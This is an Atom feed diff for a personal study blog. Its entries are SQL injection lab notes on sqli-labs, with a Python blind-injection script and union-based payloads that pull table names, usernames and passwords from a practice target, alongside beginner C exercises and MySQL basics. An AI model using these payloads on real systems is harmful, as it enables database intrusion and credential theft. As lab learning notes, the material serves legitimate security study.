@@ -1,0 +1,347 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Hexo</title>
+  
+  
+  <link href="http://wifi-0x.github.io/atom.xml" rel="self"/>
+  
+  <link href="http://wifi-0x.github.io/"/>
+  <updated>2021-11-21T09:53:43.668Z</updated>
+  <id>http://wifi-0x.github.io/</id>
+  
+  <author>
+    <name>John Doe</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/21/lab%208/"/>
+    <id>http://wifi-0x.github.io/2021/11/21/lab%208/</id>
+    <published>2021-11-21T09:53:43.302Z</published>
+    <updated>2021-11-21T09:53:43.668Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lab-8"><a href="#lab-8" class="headerlink" title="lab 8"></a>lab 8</h1><p>使用python脚本进行盲注</p><p>1，刷出库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> dic:</span><br><span class="line">        url=<span class="string">&quot;http://d1c0c861-091f-4ff0-9aaa-64dbc53cfc23.node4.buuoj.cn/Less-8/?id=1%27&quot;</span></span><br><span class="line">        payload=<span class="string">&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2，刷出表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure><p>limit  后面的数字可变 </p><p>第一个表：limit 0</p><p>第二个表：limit 1 </p><p>……</p><p>3，刷出列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure><p>limit  后面的数字可变 </p><p>第一列：limit 0</p><p>第二列：limit 1 </p><p>……</p><p>4，查用户名或密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select username from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select password from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lab-8&quot;&gt;&lt;a href=&quot;#lab-8&quot; class=&quot;headerlink&quot; title=&quot;lab 8&quot;&gt;&lt;/a&gt;lab 8&lt;/h1&gt;&lt;p&gt;使用python脚本进行盲注&lt;/p&gt;
+&lt;p&gt;1，刷出库名&lt;/p&gt;
+&lt;figure class=&quot;highlight </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/19/lab/"/>
+    <id>http://wifi-0x.github.io/2021/11/19/lab/</id>
+    <published>2021-11-19T06:47:57.480Z</published>
+    <updated>2021-11-19T06:47:57.982Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h1><p>?id=10’union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1 – qwe //一个一个地查表 </p><p>?id=10’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p><p>//一次查出全部的表但是可能因为显示位不够而漏掉一些内容</p><p><img src="https://i.loli.net/2021/11/19/qPmFyh4n8TeJdkb.png"></p><p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p><p>1.<code>?id=1&#39;</code></p><p>2.输入order by语句对字段进行猜测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p>3.输入 <code>?id=-1&#39; union select 1,2,3, --+</code></p><p>4,爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p><p>5,爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p><p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p><p>2021 11 19 </p><p>在实验室学习的一天</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lab&quot;&gt;&lt;a href=&quot;#lab&quot; class=&quot;headerlink&quot; title=&quot;lab&quot;&gt;&lt;/a&gt;lab&lt;/h1&gt;&lt;p&gt;?id=10’union select 1,table_name,3 from information_schema.tables </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/"/>
+    <id>http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/</id>
+    <published>2021-11-16T15:15:58.833Z</published>
+    <updated>2021-11-16T15:15:59.058Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png&quot;&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
+    <id>http://wifi-0x.github.io/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/</id>
+    <published>2021-11-16T12:12:57.287Z</published>
+    <updated>2021-11-16T14:15:37.069Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="如何判断是字符型注入还是数字型注入"><a href="#如何判断是字符型注入还是数字型注入" class="headerlink" title="如何判断是字符型注入还是数字型注入"></a>如何判断是字符型注入还是数字型注入</h1><p><img src="https://i.loli.net/2021/11/16/eQJ8KEMIw93Ut4C.png"></p><pre><code> 1：字符型会自动加入两个单引号。 2：数字型不会加入两个单引号。 3：被单引号括起来的数据会被当成一个整体。 4：LIMIT m,n 会影响select语句的结果。 5：页面回显发生错误和页面不回显数据是两回事。前者表示sql语句出错了，后者表示sql语句没有错误，但是条件不成立。</code></pre><h1 id="union用法："><a href="#union用法：" class="headerlink" title="union用法："></a>union用法：</h1><p>UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥<br>有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同。<br>说白了，就是把两个表的结果拼接成为一个表，能够拼接的前提是两个表都用相同的列，你是3列，<br>我也是3列。<br>前面讲过我们要做的第一件事，是判断有多少列，主要目的就是为了使用union联合查询。<br>(因为要构造相同数量的列)</p><h1 id="group-concat-用法："><a href="#group-concat-用法：" class="headerlink" title="group_concat()用法："></a>group_concat()用法：</h1><p>group_concat(id)              表示把id字段的值在同一行打印出来，逗号分隔(默认)<br>group_concat(‘<em>‘,id1,id2)   表示使用</em>进行分割，拼接id1和id2</p><h1 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h1><p>使用+ 或 -</p><p>id=1+1</p><p>id=2-1</p><p>当符号不能直接使用时用下面的网址进行<strong>转换</strong></p><p><a href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;如何判断是字符型注入还是数字型注入&quot;&gt;&lt;a href=&quot;#如何判断是字符型注入还是数字型注入&quot; class=&quot;headerlink&quot; title=&quot;如何判断是字符型注入还是数字型注入&quot;&gt;&lt;/a&gt;如何判断是字符型注入还是数字型注入&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/"/>
+    <id>http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/</id>
+    <published>2021-11-11T13:01:23.390Z</published>
+    <updated>2021-11-15T14:33:39.359Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="秀哥硬核SQL"><a href="#秀哥硬核SQL" class="headerlink" title="秀哥硬核SQL"></a>秀哥硬核SQL</h1><hr><p><strong>有什么库</strong>       show databases;</p><p><strong>有什么表</strong>       show tables;</p><p><strong>表里的结构</strong>    desc 表名；</p><p><strong>使用库</strong>            use 库名；</p><p><strong>建立库</strong>            create database 库名</p><p><strong>删除库</strong>            drop database 库名</p><p><strong>建立表</strong>            create table 表名 (字段名1 字段类型，字段名2 字段类型) </p><h4 id="常见类型-数字-int-字符串-varchar-需要加“-”"><a href="#常见类型-数字-int-字符串-varchar-需要加“-”" class="headerlink" title="常见类型 数字 int 字符串 varchar(需要加“ ”)"></a><u><em>常见类型 数字 int 字符串 varchar</em></u>(需要加“ ”)</h4><p><strong>删除表</strong>            drop table 表名</p><h3 id="修改表内字段"><a href="#修改表内字段" class="headerlink" title="修改表内字段{"></a><strong>修改表内字段</strong>{</h3><p><strong>增加字段</strong> alter table 表名 add 字段名 字段类型</p><p><strong>删字段</strong> alter table 表名 drop 字段名</p><p><strong>修改表内字段名</strong> alter table 表名 change 旧字符名 新字符名 新类型 </p><p>}</p><h3 id="往表内插入数据（增）暂时不会插入汉字"><a href="#往表内插入数据（增）暂时不会插入汉字" class="headerlink" title="往表内插入数据（增）暂时不会插入汉字"></a><strong>往表内插入数据（增）</strong>暂时不会插入汉字</h3><p>：insert into 表名values (值1, 值2);//按顺序插入</p><p>​                                         或者 insert into 表名（列名1，列名2） values(值1， 值2)</p><p><strong>修改数据</strong> update 表名 set 列名=新值 where 列名=旧值</p><p>​                 update 表名 set 列名=新列值，列名2=新列值 where 列名 =旧列值</p><p><strong>删除数据</strong> delete from 表名 where 列名=列值  </p><p>//这会删除这列中的一个数 </p><p>//如果不写 where及后面的东西 就会删除整个表</p><p>​                  </p><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p>select*from 表名 where 条件（条件可以这样写 列名=”这列中的某个数据”）</p><p>select  字段名 from 表名 where 条件 </p><p>SELECT *FROM 表名 ORDER BY 列名(可以用1，2，3.) </p><p>  //在最后面加<strong>desc</strong>将以降序排列</p><h5 id="休眠-select-sleep（10）；-服务器摸鱼10s"><a href="#休眠-select-sleep（10）；-服务器摸鱼10s" class="headerlink" title="休眠 select sleep（10）； //服务器摸鱼10s"></a>休眠 select sleep（10）； //服务器摸鱼10s</h5><p><strong>注意</strong></p><p><em>1 SQL语句结尾要加 ;</em></p><p><em>2 数据库语句部分大小写，但是数据分</em></p><p><em>3 数值要加   ‘66’</em></p><h3 id="cmd的命令"><a href="#cmd的命令" class="headerlink" title="cmd的命令"></a>cmd的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//进入d盘</span><br><span class="line">D:</span><br><span class="line">//进入F盘</span><br><span class="line">F:</span><br><span class="line">查看当前目录 dir</span><br><span class="line">打开 cd</span><br><span class="line">返回上一级 cd ..</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="打开mysql"><a href="#打开mysql" class="headerlink" title="打开mysql"></a>打开mysql</h3><p>D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p</p><p>第一步 d：//切换到d盘</p><p>第二步  cd D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql</p><p>第三步  mysql -u root -****</p><p>2021 11 15 星期一</p><h1 id="Fighting"><a href="#Fighting" class="headerlink" title="Fighting"></a><em><strong>Fighting</strong></em></h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;秀哥硬核SQL&quot;&gt;&lt;a href=&quot;#秀哥硬核SQL&quot; class=&quot;headerlink&quot; title=&quot;秀哥硬核SQL&quot;&gt;&lt;/a&gt;秀哥硬核SQL&lt;/h1&gt;&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;有什么库&lt;/strong&gt;       show databases;&lt;/</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/"/>
+    <id>http://wifi-0x.github.io/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/</id>
+    <published>2021-11-09T14:20:27.853Z</published>
+    <updated>2021-11-09T14:20:28.132Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h1><p><img src="https://i.loli.net/2021/11/09/QEjB8qTLZzp7lUW.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> z = <span class="number">0</span>;</span><br><span class="line">z = x + y;</span><br><span class="line"><span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">565</span>, b=<span class="number">5654</span>;<span class="comment">//什么值都不影响</span></span><br><span class="line">scanf_s(<span class="string">&quot;%d%d&quot;</span>, &amp;a,&amp;b);<span class="comment">//两个%d之间不能有’，‘</span></span><br><span class="line"><span class="keyword">int</span> c = Add(a, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/09/NL2ikjAetyofvUM.png"></p><p><em>天气晴 今天好冷</em></p><p>2021 11 09</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;自定义函数&quot;&gt;&lt;a href=&quot;#自定义函数&quot; class=&quot;headerlink&quot; title=&quot;自定义函数&quot;&gt;&lt;/a&gt;自定义函数&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/09/QEjB8qTLZzp7lUW.pn</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/04/November%204,2021/"/>
+    <id>http://wifi-0x.github.io/2021/11/04/November%204,2021/</id>
+    <published>2021-11-04T08:01:48.522Z</published>
+    <updated>2021-11-04T11:19:20.260Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="November-4-2021"><a href="#November-4-2021" class="headerlink" title="November 4,2021"></a>November 4,2021</h1><h3 id="普通查找"><a href="#普通查找" class="headerlink" title="普通查找"></a>普通查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">6</span>;</span><br><span class="line"><span class="comment">//写一个代码，在arr数组中找到7</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);计算元素个数</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (k == arr[i]) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了，下标是：%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i == sz)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p><em>在顺序结构中查询的效率更高</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int arr[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">int k = 15;**这里输入想查询的数</span><br><span class="line">//写一个代码，在arr数组(按顺序排序)中找到7</span><br><span class="line">int sz = sizeof(arr) / sizeof(arr[0]);</span><br><span class="line">int left = 0;</span><br><span class="line">int right = sz - 1;</span><br><span class="line"></span><br><span class="line">while (left &lt;= right)</span><br><span class="line">&#123;</span><br><span class="line">int mid = (left + right) / 2;</span><br><span class="line">if (arr[mid] &gt; k)</span><br><span class="line">&#123;</span><br><span class="line">right = mid - 1;</span><br><span class="line">&#125;</span><br><span class="line">else if (arr[mid] &lt; k)</span><br><span class="line">&#123;</span><br><span class="line">left = mid + 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;找到了，下标是:%d\n&quot;, mid);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (left&gt;right)</span><br><span class="line">printf(&quot;找不到\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####################</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span><span class="comment">//包含Sleep函数（停止）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span><span class="comment">//-&gt;system</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//例子 char arr[]=&quot;abc&quot;;</span></span><br><span class="line"><span class="comment">// 括号里面实际为[a b c \0]</span></span><br><span class="line"><span class="comment">// 下标为          0 1 2  3</span></span><br><span class="line"><span class="comment">//字符串结尾总是多出来/0</span></span><br><span class="line"><span class="keyword">char</span> arr1[] = <span class="string">&quot;welcome to bit!!!!!!&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> arr2[] = <span class="string">&quot;####################&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> right = <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(arr1[<span class="number">0</span>]) - <span class="number">2</span>;<span class="comment">//方法1</span></span><br><span class="line"><span class="comment">//因为下标是从0开始 所以-1 </span></span><br><span class="line"><span class="comment">//因为有\0 所以我们输入的最后一个字符的下标为sz-2</span></span><br><span class="line"><span class="comment">//strlen 头文件要用#include&lt;string.h&gt;。</span></span><br><span class="line"><span class="comment">//strlen()只是统计字符串的长度，统计到&#x27;\0&#x27;结束，但不包括&#x27;\0&#x27;，这个与sizeof()不一样。</span></span><br><span class="line"><span class="comment">// int right = strlen(arr1);方法2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt;= right)</span><br><span class="line">&#123;</span><br><span class="line">arr2[left] = arr1[left];</span><br><span class="line">arr2[right] = arr1[right];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, arr2);</span><br><span class="line">Sleep(<span class="number">500</span>);<span class="comment">//休息500毫秒</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//执行系统命令的一个函数 cls 清空屏幕</span></span><br><span class="line">left++;</span><br><span class="line">right--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, arr2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>天气 一天的小雨</em></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;November-4-2021&quot;&gt;&lt;a href=&quot;#November-4-2021&quot; class=&quot;headerlink&quot; title=&quot;November 4,2021&quot;&gt;&lt;/a&gt;November 4,2021&lt;/h1&gt;&lt;h3 id=&quot;普通查找&quot;&gt;&lt;a href</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/11/01/MYSQL/"/>
+    <id>http://wifi-0x.github.io/2021/11/01/MYSQL/</id>
+    <published>2021-11-01T13:31:01.684Z</published>
+    <updated>2021-11-16T14:36:04.250Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>查库：select schema_name from information_schema.schemata;</p><p>查表：select table_name from information_schema.tables where table_schema=’security’;</p><p>查列：select column_name from  information_schema.columns where table_name=’users’;</p><p>查字段：select username,password from security.users;</p><p><img src="https://i.loli.net/2021/11/06/pEtf2gQ7FSAzNnr.png"></p><p><img src="https://i.loli.net/2021/11/06/EKztJmBueQk1ZIx.png"></p><p><img src="https://i.loli.net/2021/11/06/62FztDxqW1IBCPy.png"></p><p>第一步，CREATE DATABASE py2py20py6;</p><p>然后 use py2py20py6;</p><p>再CREATE TABLE stu(id int primary key,name char(10),class int)default charset=utf8mb4;(这里有个小错误)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入数据，<span class="function">INSERT INTO <span class="title">stu</span> <span class="params">(id, name, classid)</span> <span class="title">VALUES</span><span class="params">(<span class="number">1</span>, `张秀哥`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">2</span>, `膨胀哥`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">3</span>, `锋锋`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">4</span>, `卷王`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">5</span>, `小帅`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">6</span>, `帅哥`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">7</span>, `乐乐`, <span class="number">2</span>)</span>,<span class="params">(<span class="number">8</span>, `独秀`, <span class="number">2</span>)</span>,<span class="params">(<span class="number">9</span>, `第一`, <span class="number">2</span>)</span></span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/EabTQjtSImKsDOR.png"></p><p>TRUNCATE TABLE stu; ——-清空数据库</p><p>SELECT * FROM stu; ————-查库</p><p>2021 11 06 一天的小雨</p>]]></content>
+    
+    
+      
+      
